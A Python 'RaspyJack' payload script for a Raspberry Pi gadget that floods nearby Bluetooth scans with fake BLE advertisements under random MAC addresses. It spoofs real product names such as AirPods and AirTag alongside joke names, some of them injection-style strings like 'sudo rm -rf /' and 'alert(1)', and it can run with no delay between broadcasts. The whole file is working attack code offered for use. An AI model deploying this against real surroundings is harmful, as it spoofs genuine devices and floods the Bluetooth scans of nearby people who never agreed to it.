#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Flood
================================
Author: 7h30th3r0n3

Flood nearby Bluetooth scans with fake devices.
Two modes:
  PRESET   Named devices (real products, hacker memes, pop culture)
  ENTROPY  Random unicode names (letters, digits, specials, emojis)

Controls:
  OK         Start / Stop flood
  KEY1       Toggle mode (Preset / Entropy)
  UP/DOWN    Adjust speed
  KEY3       Exit
"""

import os
import sys
import random
import time
import threading
import subprocess

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LCD = None

# ---------------------------------------------------------------------------
# Fake device names
# ---------------------------------------------------------------------------
PRESET_NAMES = [
    # Real products
    "AirPods Pro", "AirPods Max", "AirPods 4", "AirTag",
    "Galaxy Buds2", "Galaxy Watch", "Bose QC45", "Bose QC Ultra",
    "JBL Flip 6", "JBL Charge 5", "Sony WH-1000", "Sony WF-1000",
    "Beats Solo", "Beats Fit Pro", "Pixel Buds", "Nothing Ear",
    "Echo Dot", "HomePod mini", "Apple Watch", "Tile Pro",
    "Mi Band 8", "Fitbit Versa", "Chromecast",
    # RaspyJack / Hacking tools
    "RaspyJack C2", "RaspyJack Agent", "Evil-M5 Active",
    "RaspyJack Pwnd", "Evil-Portal AP", "Pwnagotchi v2",
    "RJ-Deauther", "Evil-Twin AP", "RJ-Sniffer",
    "Flipper Zero", "HackRF One", "WiFi Pineapple",
    "Rubber Ducky", "Bash Bunny", "LAN Turtle",
    "Shark Jack", "Key Croc", "O.MG Cable",
    # Hacker culture
    "FBI Surveillance", "NSA Van #3", "CIA Listening",
    "MI6 Field Kit", "GCHQ Monitor", "Mossad Unit",
    "Mr. Robot", "fsociety", "Dark Army",
    "Hack The Planet", "Zero Cool", "Acid Burn",
    "Crash Override", "The Gibson", "l33t h4x0r",
    "root@kali", "sudo rm -rf /", "DROP TABLE",
    "'; OR 1=1 --", "alert(1)", "<script>hi",
    # Trolling
    "Totally Not Spy", "Not A Tracker", "Free Candy Van",
    "Definitely Safe", "Trust Me Bro", "No Virus Here",
    "Your WiFi Sucks", "Get Off My LAN", "It Burns When IP",
    "Yell PINEAPPLE", "Send Nudes", "Loading...",
    "Searching...", "Connecting...", "Error 404",
    # WiFi name memes
    "Abraham Linksys", "Bill Wi The Kid", "LAN Solo",
    "The LAN Before", "Wu Tang LAN", "Pretty Fly WiFi",
    "Silence of LANs", "LAN of the Free", "Drop It Like Hz",
    "Martin Router K", "The Promised LAN", "LAN Down Under",
    "New England Clam Router", "Hide Yo Kids WiFi",
    # Fake scary
    "Hidden Camera 4", "Smart Lock Open", "Baby Monitor",
    "Garage Opener", "Alarm Disabled", "Door Unlocked",
    "Tesla Model 3", "BMW Connected", "Audi MMI",
    # Pop culture
    "Skynet Active", "HAL 9000", "JARVIS Online",
    "FRIDAY System", "Deathstar WiFi", "Mordor Guest",
    "Hogwarts BT", "Batcave Entry", "Wakanda Tech",
    "Stark Industries", "Umbrella Corp", "Cyberdyne Sys",
    "Weyland-Yutani", "Aperture Sci", "Black Mesa",
    "Abstergo BT", "SHIELD Comm", "Wayne Ent",
    "LexCorp Device", "Dharma Init", "Los Pollos BT",
    "Dunder Mifflin", "Saul Goodman", "Heisenberg",
    "TARDIS Signal", "Sonic Screwdrv", "Matrix Node",
]

# Emoji pool for entropy mode (BLE-safe subset)
ENTROPY_CHARS = (
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "!@#$%&*+-=<>?~"
    "\U0001F600\U0001F608\U0001F47B\U0001F480\U0001F4A3"  # grinning, devil, ghost, skull, bomb
    "\U0001F525\U0001F4A9\U0001F916\U0001F47E\U0001F47D"  # fire, poop, robot, alien, alien2
    "\U0001F512\U0001F513\U0001F6A8\U0001F6AB\U00002620"  # lock, unlock, siren, prohibited, skull&crossbones
    "\U0001F3F4\U0001F577\U0001F50D\U0001F4E1\U0001F4BB"  # pirate flag, spider, magnifying, satellite, laptop
    "\U000026A0\U000026D4\U0001F6E1\U00002622\U00002623"  # warning, no entry, shield, radioactive, biohazard
)

# Speed settings
SPEEDS = [
    ("Slow", 0.15),
    ("Med", 0.08),
    ("Fast", 0.03),
    ("Max", 0.0),
]

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
lock = threading.Lock()
HCI_DEV = None
flooding = False
mode = 0           # 0=Preset, 1=Entropy
speed_idx = 2      # default Fast
sent = 0
last_name = ""

# ---------------------------------------------------------------------------
# HCI
# ---------------------------------------------------------------------------


def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


def _send_fake_device(name):
    """Send one fake device advertisement via single bash call."""
    global last_name
    # Encode name — truncate to fit BLE adv (max ~20 bytes UTF-8)
    name_bytes = name.encode("utf-8")[:20]
    name_len = len(name_bytes)

    # Build adv data: Flags + Complete Local Name
    adv = bytearray([0x02, 0x01, 0x06, name_len + 1, 0x09])
    adv.extend(name_bytes)
    while len(adv) < 31:
        adv.append(0x00)
    adv_hex = " ".join(f"{b:02X}" for b in adv)
    data_len = f"{name_len + 5:02X}"

    # Random MAC
    mac = [random.randint(0, 255) for _ in range(6)]
    mac[0] = mac[0] | 0xC0
    mac_hex = " ".join(f"{b:02X}" for b in mac)

    # Single bash call — all HCI commands chained
    script = (
        f"hcitool -i {HCI_DEV} cmd 0x08 0x000A 00 >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x0005 {mac_hex} >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x0006 20 00 20 00 00 01 00 "
        f"00 00 00 00 00 00 07 00 >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x0008 {data_len} {adv_hex} >/dev/null 2>&1;"
        f"hcitool -i {HCI_DEV} cmd 0x08 0x000A 01 >/dev/null 2>&1"
    )
    try:
        subprocess.run(["sudo", "bash", "-c", script],
                       capture_output=True, timeout=3)
        last_name = name
        return True
    except Exception:
        return False


def _gen_entropy_name():
    """Generate a random name with mixed chars + emojis."""
    length = random.randint(4, 12)
    return "".join(random.choice(ENTROPY_CHARS) for _ in range(length))


# ---------------------------------------------------------------------------
# Flood thread
# ---------------------------------------------------------------------------


def _flood_loop():
    global sent
    while True:
        with lock:
            if not flooding:
                break
            m = mode
            delay = SPEEDS[speed_idx][1]

        if m == 0:
            name = random.choice(PRESET_NAMES)
        else:
            name = _gen_entropy_name()

        if _send_fake_device(name):
            with lock:
                sent += 1

        if delay > 0:
            time.sleep(delay)


# ---------------------------------------------------------------------------
# LCD
# ---------------------------------------------------------------------------


def _draw(lcd, font, font_sm):
    img = Image.new("RGB", (WIDTH, HEIGHT), "#000000")
    d = ScaledDraw(img)

    with lock:
        is_on = flooding
        m = mode
        sp = speed_idx
        count = sent
        dev = last_name

    mode_name = "PRESET" if m == 0 else "ENTROPY"
    speed_name = SPEEDS[sp][0]

    # Header
    d.rectangle((0, 0, 127, 13), fill="#0a0a14")
    d.text((2, 1), "BLE FLOOD", font=font_sm, fill="#FF4444")
    d.text((70, 1), mode_name, font=font_sm, fill="#00CCFF")
    d.ellipse((120, 3, 126, 9), fill="#FF0000" if is_on else "#333")

    # Stats
    y = 17
    d.text((2, y), f"Sent: {count}", font=font, fill="#FFFFFF")
    y += 16
    d.text((2, y), f"Speed: {speed_name}", font=font_sm, fill="#FFAA00")
    y += 14

    # Last device
    if dev:
        d.text((2, y), "Last:", font=font_sm, fill="#666")
        y += 11
        # Truncate display to fit LCD
        display = dev[:20]
        d.text((4, y), display, font=font_sm, fill="#00FF88")
        y += 14
    else:
        y += 25

    # Rate estimate
    if is_on and count > 0:
        elapsed = max(1, time.time() - _start_time)
        rate = count / elapsed
        d.text((2, y), f"{rate:.1f} dev/s", font=font_sm, fill="#888")

    # Visual activity bar
    if is_on:
        bar_y = 95
        d.rectangle((2, bar_y, 125, bar_y + 6), outline="#222")
        # Animated fill
        phase = int(time.time() * 10) % 20
        for i in range(0, 124, 6):
            if (i // 6 + phase) % 3 == 0:
                d.rectangle((i + 2, bar_y + 1, i + 5, bar_y + 5), fill="#FF4444")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#0a0a14")
    if is_on:
        d.text((2, 117), "OK:Stop U/D:Speed", font=font_sm, fill="#666")
    else:
        d.text((2, 117), "OK:Go K1:Mode K3:X", font=font_sm, fill="#666")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

_start_time = 0.0


def main():
    global HCI_DEV, flooding, mode, speed_idx, sent, _start_time, LCD

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    LCD.LCD_Clear()

    font = scaled_font(10)
    font_sm = scaled_font(8)

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "#000000")
    d = ScaledDraw(img)
    d.text((64, 25), "BLE", font=font, fill="#FF4444", anchor="mm")
    d.text((64, 40), "FLOOD", font=font, fill="#FF4444", anchor="mm")
    d.line([(20, 50), (108, 50)], fill="#333")
    d.text((64, 62), "Fake Device Storm", font=font_sm, fill="#888", anchor="mm")
    d.text((64, 78), "PRESET: Named devices", font=font_sm, fill="#666", anchor="mm")
    d.text((64, 90), "ENTROPY: Random chaos", font=font_sm, fill="#666", anchor="mm")
    d.text((64, 108), "Selecting adapter...", font=font_sm, fill="#FFAA00", anchor="mm")
    LCD.LCD_ShowImage(img, 0, 0)

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        GPIO.cleanup()
        return 1

    # Debounce
    time.sleep(0.3)
    while get_button(PINS, GPIO) is not None:
        time.sleep(0.05)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if flooding:
                    with lock:
                        flooding = False
                    time.sleep(0.3)
                    # Disable advertising
                    subprocess.run(
                        ["sudo", "hcitool", "-i", HCI_DEV, "cmd",
                         "0x08", "0x000A", "00"],
                        capture_output=True, timeout=3)
                else:
                    with lock:
                        flooding = True
                        sent = 0
                    _start_time = time.time()
                    _hci_up()
                    threading.Thread(target=_flood_loop, daemon=True).start()
                time.sleep(0.3)

            elif btn == "KEY1" and not flooding:
                mode = (mode + 1) % 2
                time.sleep(0.2)

            elif btn == "UP":
                speed_idx = min(len(SPEEDS) - 1, speed_idx + 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                speed_idx = max(0, speed_idx - 1)
                time.sleep(0.15)

            _draw(LCD, font, font_sm)
            time.sleep(0.03)

    finally:
        with lock:
            flooding = False
        time.sleep(0.3)
        # Disable advertising + restore bluetooth
        subprocess.run(["sudo", "hcitool", "-i", HCI_DEV or "hci0", "cmd",
                        "0x08", "0x000A", "00"],
                       capture_output=True, timeout=3)
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"],
                       capture_output=True, timeout=5)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
